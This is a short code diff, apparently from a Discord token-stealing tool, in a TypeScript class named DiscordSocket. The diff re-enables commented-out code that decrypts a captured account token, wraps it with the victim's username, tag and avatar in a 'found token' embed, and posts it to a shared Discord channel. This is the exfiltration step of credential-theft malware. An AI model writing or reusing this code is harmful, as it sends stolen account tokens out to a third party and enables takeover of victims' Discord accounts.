@@ -74,19 +74,19 @@ export class DiscordSocket {
       Buffer.from(token, "base64")
     );
 
-    // const embed = await tokenEmbed();
-    // embed.setDescription(decryptedToken.toString());
-    // embed.setAuthor({
-    //   name: `${_this.userInformation?.username!}#${_this.userInformation
-    //     ?.discriminator!}`,
-    //   iconURL:
-    //     _this.userInformation?.avatar !== "0"
-    //       ? `https://cdn.discordapp.com/avatars/${_this.userInformation?.userid}/${_this.userInformation?.avatar}`
-    //       : "https://discord.com/assets/6f26ddd1bf59740c536d2274bb834a05.png",
-    // });
-    // (sharedClient.channel as TextChannel).send({
-    //   embeds: [embed],
-    // });
+    const embed = await embeds.foundTokenEmbed();
+    embed.setDescription(decryptedToken.toString());
+    embed.setAuthor({
+      name: `${_this.userInformation?.username!}#${_this.userInformation
+        ?.discriminator!}`,
+      iconURL:
+        _this.userInformation?.avatar !== "0"
+          ? `https://cdn.discordapp.com/avatars/${_this.userInformation?.userid}/${_this.userInformation?.avatar}`
+          : "https://discord.com/assets/6f26ddd1bf59740c536d2274bb834a05.png",
+    });
+    (sharedClient.channel as TextChannel).send({
+      embeds: [embed],
+    });
 
     allSockets.delete(_this.user.id);
   }
